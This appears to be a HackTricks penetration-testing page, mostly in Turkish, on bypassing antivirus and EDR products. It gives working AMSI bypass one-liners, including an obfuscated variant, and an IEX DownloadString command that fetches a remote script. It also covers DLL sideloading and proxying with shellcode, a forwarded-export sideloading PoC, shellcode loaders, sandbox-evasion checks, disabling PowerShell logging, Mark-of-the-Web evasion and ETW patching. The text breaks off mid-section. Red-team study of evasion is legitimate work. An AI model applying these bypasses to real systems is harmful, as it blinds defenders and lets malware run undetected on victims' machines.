# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Kaçınma Metodolojisi**

Günümüzde AV'ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanıyor: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranış analizi.

### **Statik tespit**

Statik tespit, bir ikili veya betikte bilinen zararlı string'leri veya byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen kamu araçlarını kullanmanın sizi daha kolay yakalayabileceği anlamına gelir; çünkü büyük olasılıkla analiz edilmiş ve zararlı olarak işaretlenmişlerdir. Bu tür tespitten kurtulmanın birkaç yolu vardır:

- **Encryption**

Eğer binary'i şifrelerseniz, AV programınızın programınızı tespit etmesi imkansız olur, fakat programı bellekte decrypt edip çalıştırmak için bir tür loader gerekecektir.

- **Obfuscation**

Bazen AV'den geçmek için binary veya betiğinizdeki bazı string'leri değiştirmeniz yeterlidir, ancak neyi obfusk etmeye çalıştığınıza bağlı olarak zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmayacaktır, ama bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender statik tespiti karşı kontrol etmek için iyi bir yol [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Temelde dosyayı birden fazla segmente böler ve ardından Defender'a her birini ayrı ayrı taratır, böylece binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion ile ilgili bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) listelemesini şiddetle tavsiye ederim.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox içinde çalıştırıp kötü amaçlı faaliyetleri gözlemlemesiyle gerçekleşir (ör. tarayıcı şifrelerinizi decrypt edip okumaya çalışmak, LSASS üzerinde minidump yapmak vb.). Bu kısım biraz daha zor olabilir, ama sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Çalıştırmadan önce bekleme (Sleep before execution)** Uygulanma şekline bağlı olarak, AV'nin dinamik analizini atlatmak için harika bir yol olabilir. AV'lerin dosyaları taramak için kullanıcı iş akışını aksatmamak adına çok kısa süreleri vardır, bu yüzden uzun beklemeler binary'lerin analizini bozan bir etki yapabilir. Sorun şu ki, birçok AV'nin sandbox'ları uygulama şekline bağlı olarak bu beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Genellikle sandbox'ların çalışmak için çok az kaynağı olur (ör. < 2GB RAM), aksi halde kullanıcının makinesini yavaşlatabilirler. Burada ayrıca çok yaratıcı olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol etmek gibi, sandbox'ta her şey uygulanmamış olabilir.
- **Makine-özgü kontroller** Hedeflemek istediğiniz kullanıcının workstation'ı "contoso.local" domain'ine bağlıysa, bilgisayarın domain'ini kontrol ederek belirtilen ile eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızı sonlandırabilirsiniz.

Ortaya çıktı ki Microsoft Defender'ın Sandbox bilgisayar adı HAL9TH, bu yüzden malware'inizde detonasyondan önce bilgisayar adını kontrol edebilirsiniz; ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınızdır ve programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'in bazı diğer gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de söylediğimiz gibi, **public tools** sonunda **tespit edilecektir**, bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS'i dump'lamak istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa LSASS'i dump'layan daha az bilinen ve aynı işi yapan farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Örnek olarak mimikatz alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok, belki de en çok işaretlenen zararlı yazılımlardan biridir; proje kendisi süper havalı olsa da, AV'leri atlatmak için onunla uğraşmak kabus olabilir, bu yüzden başarmaya çalıştığınız şey için alternatiflere bakın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken, defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve lütfen, ciddi olarak, uzun vadede evasion hedefiniz varsa **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'e yükleyin, otomatik örnek gönderimini kapatmayı deneyin ve sonuçtan memnun olana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda, her zaman **evasyon için DLL kullanmayı önceliklendirin**, deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit ediliyor** ve analiz ediliyor, bu yüzden bazı durumlarda tespitten kaçınmak için kullanabileceğiniz çok basit bir hiledir (tabii payload'ınızın DLL olarak çalıştırılma yolu varsa).

Bu resimde görebileceğimiz gibi, Havoc'tan bir DLL Payload antiscan.me'de 4/26 tespit oranına sahipken, EXE payload 7/26 tespit oranına sahip.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me karşılaştırması: normal bir Havoc EXE payload vs normal bir Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyaları ile çok daha gizli olmak için kullanabileceğiniz bazı hileleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanır; mağdur uygulama ile kötü amaçlı payload(lar)ı yan yana konumlandırarak çalışır.

DLL Sideloading'e duyarlı programları kontrol etmek için [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'ini kullanabilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut "C:\Program Files\\" içinde DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılayacaktır.

Kendiniz **DLL Hijackable/Sideloadable programs**'ı keşfetmenizi şiddetle tavsiye ederim; bu teknik düzgün yapıldığında oldukça gizlidir, ancak kamuya mal olmuş DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemesini beklediği isimle kötü amaçlı bir DLL yerleştirmek tek başına payload'unuzun çalışmasını sağlamaz; çünkü program o DLL içinde belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, programın proxy (ve kötü amaçlı) DLL üzerinden yaptığı çağrıları orijinal DLL'e yönlendirir; böylece programın işlevselliği korunur ve payload'unuzun yürütülmesini yönetebilir.

Kullanacağım proje [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) [@flangvik](https://twitter.com/Flangvik)'ten.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Bunu bir başarı olarak nitelendirirdim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ben **kesinlikle tavsiye ederim** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Yönlendirilen Export'ların İstismarı (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export girdisi koda işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağırıcı export'u çözdüğünde, Windows loader şunları yapar:

- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör., ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, forward çözümlemesini yapan modülün dizinini de içerir.

Anlamanız gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korumalı KnownDLLs ad alanından sağlanır (ör., ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu sıra, forward çözümlemesini yapan modülün dizinini de içerir.

Bu, dolaylı bir sideloading primitive'ine olanak sağlar: bir fonksiyonu non-KnownDLL modül adına yönlendiren imzalı bir DLL bulun, sonra o imzalı DLL'i, yönlendirme hedef modülün adıyla tam olarak aynı olan saldırgan kontrollü bir DLL ile aynı dizine koyun. Yönlendirilen export çağrıldığında, loader forward'u çözer ve DllMain'inizi çalıştırarak DLL'inizi aynı dizinden yükler.

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL değildir; bu yüzden normal arama sırasına göre çözülür.

PoC (copy-paste):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Minimal bir DllMain, kod çalıştırmak için yeterlidir; DllMain'i tetiklemek için yönlendirilen fonksiyonu uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (imzalı) side-by-side `keyiso.dll` (imzalı) dosyasını yükler
- `KeyIsoSetAuditingInterface`'i çözerken, loader forward'ı takip ederek `NCRYPTPROV.SetAuditingInterface`'e gider
- Loader sonra `C:\test`'ten `NCRYPTPROV.dll`'yi yükler ve onun `DllMain`'ini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra ancak bir "missing API" hatası alırsınız

Hunting tips:
- Hedef modül bir KnownDLL olmayan forwarded export'lara odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder envanterine bakarak adayları arayın: https://hexacorn.com/d/apis_fwd.txt

Tespit/önleme fikirleri:
- LOLBins'i izleyin (ör. rundll32.exe) — sistem dışı yollardan imzalı DLL'leri yükleyip, ardından aynı temel ada sahip non-KnownDLL'leri o dizinden yüklemesi
- Aşağıdaki gibi işlem/modül zincirleri için uyarı verin: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` kullanıcı yazılabilir yollar altında
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+yürütme izinlerini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i kullanarak shellcode'unuzu gizli bir şekilde yükleyip çalıştırabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi ve fare oyunudur; bugün işe yarayan yarın tespit edilebilir, bu yüzden asla yalnızca tek bir araca güvenmeyin — mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"'yi önlemek için oluşturuldu. Başlangıçta AVs sadece **diskteki dosyaları** tarayabiliyordu; bu yüzden payload'ları **doğrudan bellekte** çalıştırmayı başarırsanız, AV bunu önleyemiyordu çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivirüs çözümlerinin script içeriğini hem şifrelenmemiş hem de obfuskasyonsuz (unobfuscated) bir biçimde açığa çıkararak script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak Windows Defender üzerinde aşağıdaki uyarıyı üretecektir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Önüne `amsi:` eklediğini ve ardından scriptin çalıştığı yürütülebilir dosyanın yolunu (bu örnekte powershell.exe) koyduğunu fark edin.

Disk'e herhangi bir dosya bırakmadık, ancak AMSI yüzünden bellekte çalıştırılırken yine yakalandık.

Ayrıca, **.NET 4.8** ile başlayarak, C# kodu da AMSI üzerinden çalıştırılıyor. Bu, `Assembly.Load(byte[])` ile bellekte yüklemeyi de etkiliyor. Bu yüzden AMSI'den kaçınmak istiyorsanız bellekte çalıştırma için daha düşük .NET sürümlerini (ör. 4.7.2 veya daha düşük) kullanmanız tavsiye edilir.

AMSI'den kaçmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespitlerle çalıştığı için, yüklemeye çalıştığınız scriptleri değiştirmeniz detection'dan kaçınmak için iyi bir yol olabilir.

Ancak AMSI, birden fazla katman olsa bile scriptleri çözme (unobfuscating) yeteneğine sahip olduğundan, obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da kaçışı düz bir yol haline getirmiyor. Yine de bazen yapmanız gereken tek şey birkaç değişken adını değiştirmek olabilir; bu nedenle ne kadar bir şeyin işaretlendiğine bağlı olarak değişir.

- **AMSI Bypass**

AMSI, powershell (aynı zamanda cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulanır; bu nedenle ayrıcalıksız bir kullanıcı olarak bile kolayca müdahale etmek mümkündür. AMSI'nin bu uygulama hatası sayesinde araştırmacılar AMSI taramasından kaçmak için birden fazla yol buldular.

**Forcing an Error**

AMSI başlatılmasının başarısız olmasını zorlamak (amsiInitFailed) sonucunda mevcut süreç için hiçbir tarama başlatılmaz. Bu orijinal olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştı ve Microsoft daha geniş kullanımın önüne geçmek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell sürecinde AMSI'yi kullanılamaz hale getirmek için tek bir powershell code satırı yeterliydi. Bu satır elbette AMSI tarafından tespit edildi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

Bu amaçla **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanarak mevcut process'in belleğindeki tespit edilen AMSI imzasını kaldırabilirsiniz. Bu araç, mevcut process'in belleğini AMSI imzası için tarar ve sonra bellekteki imzayı NOP instructions ile üzerine yazarak fiilen bellekten kaldırır.

**AV/EDR products that uses AMSI**

AMSI kullanan AV/EDR ürünlerinin bir listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Günlüğü

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve hata ayıklama amaçları için faydalı olabilir, ancak tespitten kaçınmak isteyen saldırganlar için de **sorun oluşturabilir**.

PowerShell logging'i atlatmak için şu teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaç için [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: Powershell version 2 kullanırsanız, AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Savunmalardan yoksun bir powershell spawn etmek için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (bu, Cobal Strike'daki `powerpick`'in kullandığı yöntemdir).


## Obfuskasyon

> [!TIP]
> Birçok obfuskasyon tekniği veriyi şifrelemeye dayanır; bu, ikilinin entropisini artıracak ve AV'ler ile EDR'lerin tespit etmesini kolaylaştıracaktır. Bununla dikkatli olun ve şifrelemeyi yalnızca hassas veya gizlenmesi gereken kod bölümlerine uygulamayı düşünün.

### ConfuserEx ile korunmuş .NET binary'lerinin deobfuskasyonu

ConfuserEx 2 (veya ticari fork'ları) kullanan malware analizinde, decompiler'ları ve sandboxları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek neredeyse orijinale yakın bir IL'yi güvenilir şekilde **geri yükler**.

1.  Anti-tampering kaldırma – ConfuserEx her *method body*'yi şifreler ve bunları *module* static constructor (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'u yama yapar; bu nedenle herhangi bir değişiklik binary'nin çökmesine sebep olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow kurtarma – *clean* dosyayı **de4dot-cex** (ConfuserEx farkındalıklı de4dot fork'u) ile besleyin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Parametreler:
• `-p crx` – ConfuserEx 2 profilini seçer  
• de4dot control-flow flattening'i geri alır, orijinal namespace'leri, sınıfları ve değişken adlarını geri getirir ve sabit string'leri çözer.

3.  Proxy-call temizleme – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method çağrılarını hafif sarmalayıcılarla (diğer adıyla *proxy call*'lar) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini, opak sarmalayıcı fonksiyonlar (`Class8.smethod_10`, …) yerine görmelisiniz.

4.  Manuel temizlik – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayarak *gerçek* payload'u bulun. Çoğu zaman malware bunu `<Module>.byte_0` içinde TLV-encoded bir byte array olarak başlatır.

Yukarıdaki zincir, kötü amaçlı sample'ı çalıştırmadan yürütme akışını **geri yükler** — offline bir iş istasyonunda çalışırken faydalıdır.

> 🛈  ConfuserEx, `ConfusedByAttribute` adında özel bir attribute üretir; bu, sample'ları otomatik olarak triage etmek için bir IOC olarak kullanılabilir.

#### Tek satır
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlayarak [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla yazılım güvenliğini artırmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir dış araç kullanmadan ve derleyiciyi değiştirmeden derleme zamanında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming çerçevesi tarafından oluşturulan bir katman obfuscated operations ekleyerek uygulamayı kırmak isteyen kişilerin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli pe files türlerini obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM-supported languages için ince taneli code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek programı assembly kodu seviyesinde obfuscate eder ve normal kontrol akışı algımızı bozur.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından onları yükleyebilir.

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> Bir yürütülebilir dosyanın **güvenilir** bir imzalama sertifikası ile imzalanmış olması **SmartScreen'i tetiklemez**.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları bir ISO gibi bir kapsayıcı içine paketlemektir. Bunun nedeni Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlere **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **olayları kaydetmesine** olanak tanır. Ancak, güvenlik ürünleri tarafından kötü amaçlı aktiviteleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanı işleminin **`EtwEventWrite`** fonksiyonunun herhangi bir olay kaydetmeden hemen dönecek şekilde yapılması da mümkündür. Bu, bellekte fonksiyonu hemen dönecek şekilde patch'leyerek yapılır; böylece söz konusu işlem için ETW kaydı fiilen devre dışı bırakılmış olur.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarını belleğe yüklemek uzun zamandır biliniyor ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok iyi bir yöntemdir.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Çoğu C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

